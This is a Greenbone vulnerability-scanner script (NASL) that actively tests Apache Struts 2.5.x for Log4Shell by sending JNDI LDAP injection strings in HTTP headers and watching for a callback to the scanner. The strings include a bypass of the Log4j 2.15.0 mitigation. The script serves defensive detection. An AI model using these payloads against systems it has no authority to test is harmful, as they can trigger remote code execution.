# SPDX-FileCopyrightText: 2022 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117950");
  script_version("2025-08-01T15:45:48+0000");
  script_cve_id("CVE-2021-44228", "CVE-2021-45046");
  script_tag(name:"last_modification", value:"2025-08-01 15:45:48 +0000 (Fri, 01 Aug 2025)");
  script_tag(name:"creation_date", value:"2022-01-28 14:45:10 +0000 (Fri, 28 Jan 2022)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-12-14 01:15:00 +0000 (Tue, 14 Dec 2021)");
  script_name("Apache Struts 2.5.x Multiple Log4j Vulnerabilities (Log4Shell) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2022 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_apache_struts_consolidation.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://struts.apache.org/announce-2021#a20211212-2");
  script_xref(name:"URL", value:"https://struts.apache.org/announce-2021#a20211217");
  script_xref(name:"URL", value:"https://logging.apache.org/log4j/2.x/security.html");
  script_xref(name:"URL", value:"https://github.com/advisories/GHSA-jfh8-c2jp-5v3q");
  script_xref(name:"URL", value:"https://github.com/advisories/GHSA-7rjr-3q55-vv33");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/12/10/1");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/12/14/4");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day/");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"Apache Struts is prone to multiple vulnerabilities in the Apache
  Log4j library.");

  script_tag(name:"vuldetect", value:"Sends various crafted HTTP GET requests and checks if the
  target is connecting back to the scanner host.

  Notes:

  - For a successful detection of this flaw the target host needs to be able to reach the scanner
  host on a TCP port randomly generated during the runtime of the VT (currently in the range of
  10000-32000).

  - This VT is using a default list of static files known for Apache Struts and is also making use
  of a possible previous Apache Struts detection to extend this list. To broaden the coverage of
  checked static files it is possible to set the 'Enable generic web application scanning' setting
  within the VT 'Global variable settings' (OID: 1.3.6.1.4.1.25623.1.0.12288) to 'yes'.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  CVE-2021-44228: Apache Log4j2 JNDI features used in configuration, log messages, and parameters do
  not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can
  control log messages or log message parameters can execute arbitrary code loaded from LDAP servers
  when message lookup substitution is enabled. This vulnerability is dubbed 'Log4Shell'.

  CVE-2021-45046: Denial of Service (DoS) and a possible remote code execution (RCE) in certain
  non-default configurations.");

  script_tag(name:"affected", value:"Apache Struts version 2.5.x is known to be affected.

  Notes:

  - This VT is also reporting a flaw for other products affected by the same payload like Apache
  Struts

  - Some products might use Apache Struts internally and thus could be affected as well");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a workaround and/or
  update suggestions.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"Workaround");

  # nb: A high timeout was chosen here because the user might have requested "Generic Web App" scans
  # which could take a good amount of time to finish depending on the size / amount of static
  # content on the remote web page.
  script_timeout(1800);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("pcap_func.inc");

ownip = this_host();
targetip = get_host_ip();

# nb: No need to run against a GOS / GSM as we know that the system isn't using Struts and Java /
# Log4j at all and thus waste scanning time on self scans.
if( executed_on_gos() ) {
  if( ownip == targetip || islocalhost() ) {
    exit( 99 ); # EXIT_NOTVULN
  }
}

# nb: If all found static files and not only the ones from the default list / the Struts HTTP
# detection should be checked. Note that if "Enable generic web application scanning" in
# "global_settings.nasl" is set to "no" (which is the default) the KB key below is set to "TRUE".
no_extended_checks = get_kb_item( "global_settings/disable_generic_webapp_scanning" );

port = http_get_port( default:8080 );

ownhostname = this_host_name();
src_filter = pcap_src_ip_filter_from_hostnames();
# nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used
# by most standard Linux/Unix operating systems. If we're choosing a port of that range we might
# have false positives due to race conditions (target is sending back a response to a request of
# another VT for which the scanner had chosen the same source port).
rnd_port = rand_int_range( min:10000, max:32000 );
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );
filter = string( "tcp and dst port ", rnd_port, " and ", src_filter, " and ", dst_filter );
filter = string( filter, " and tcp[tcpflags] & (tcp-syn) != 0" );

# nb: Just some defaults to be checked if no Struts got detected on the target and/or no static
# files exists / were found on the target.
static_files = make_list( "/struts2-showcase/struts/utils.js",
                          "/struts/utils.js" );

# Additional dirs if Struts was detected. Note that we're using the directory with / without
# "/struts" here on purpose. We're also using "nofork:TRUE" because we don't want to fork on
# multiple locations because we're getting a list of "global" static content below which would
# be checked multiple times otherwise.
if( dirs = get_app_location( cpe:CPE, port:port, nofork:TRUE ) ) {

  foreach dir( dirs ) {

    if( dir == "/" )
      dir = "";

    static_files = make_list(
      static_files,
      dir + "/struts/utils.js",
      dir + "/utils.js" );
  }
}

payloads = make_list(
  # Original PoC for CVE-2021-44228
  "${jndi:ldap://" + ownip + ":" + rnd_port + "/a}",
  "${jndi:ldap://" + ownhostname + ":" + rnd_port + "/a}",
  # Bypass of the "allowedLdapHost" mitigation in Log4j 2.15.0:
  # https://twitter.com/marcioalm/status/1471740771581652995
  # Some reports on the net says that a valid hostname needs to be given after "#" but we check the
  # IP as well just to be sure...
  "${jndi:ldap://127.0.0.1#" + ownip + ":" + rnd_port + "/a}",
  "${jndi:ldap://127.0.0.1#" + ownhostname + ":" + rnd_port + "/a}",
  # Also try with the localhost variant just to be sure...
  "${jndi:ldap://localhost#" + ownip + ":" + rnd_port + "/a}",
  "${jndi:ldap://localhost#" + ownhostname + ":" + rnd_port + "/a}"
);

if( ! no_extended_checks ) {

  targethost = http_host_name( dont_add_port:TRUE );

  js_files = http_get_kb_file_extensions( port:port, host:targethost, ext:"js" );
  if( js_files )
    static_files = make_list( static_files, js_files );

  css_files = http_get_kb_file_extensions( port:port, host:targethost, ext:"css" );
  if( css_files )
    static_files = make_list( static_files, css_files );
}

static_files = make_list_unique( static_files );

foreach static_file( static_files ) {

  foreach payload( payloads ) {

    headers = make_array( "If-Modified-Since", payload );

    req = http_get_req( port:port, url:static_file, add_headers:headers );

    # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple
    # hostnames / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(),
    # ...). Reason: If the fork would be done after calling open_sock_tcp() the child's would share
    # the same socket causing race conditions and similar.
    if( ! soc = open_sock_tcp( port ) )
      continue;

    res = send_capture( socket:soc, data:req, timeout:5, pcap_filter:filter );
    close( soc );

    if( ! res )
      continue;

    # nb: See note above on the reason for this check. This is just another fallback if something is
    # going wrong in the send_capture() call above.
    flags = get_tcp_element( tcp:res, element:"th_flags" );
    if( flags & TH_SYN ) {

      # nb: We need to call the correct get_ip_*element() function below depending on the IP version
      # of the received IP packet.
      ip_vers_hex = hexstr( res[0] );
      if( ip_vers_hex[0] == 4 ) {
        src_ip = get_ip_element( ip:res, element:"ip_src" );
        dst_ip = get_ip_element( ip:res, element:"ip_dst" );
      } else if( ip_vers_hex[0] == 6 ) {
        src_ip = get_ipv6_element( ipv6:res, element:"ip6_src" );
        dst_ip = get_ipv6_element( ipv6:res, element:"ip6_dst" );
      }

      if( ! src_ip )
        src_ip = "N/A";

      if( ! dst_ip )
        dst_ip = "N/A";

      # Note that we can't do a reporting of our sent HTTP request as there might be race conditions
      # with e.g. delayed responses which would make our VT to report the wrong HTTP request.
      report = 'It was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).\n\n';
      report += "Destination IP:   " + dst_ip + ' (receiving IP on scanner host side)\n';
      report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
      report += "Originating IP:   " + src_ip + " (originating IP from target host side)";
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host.
exit( 0 );
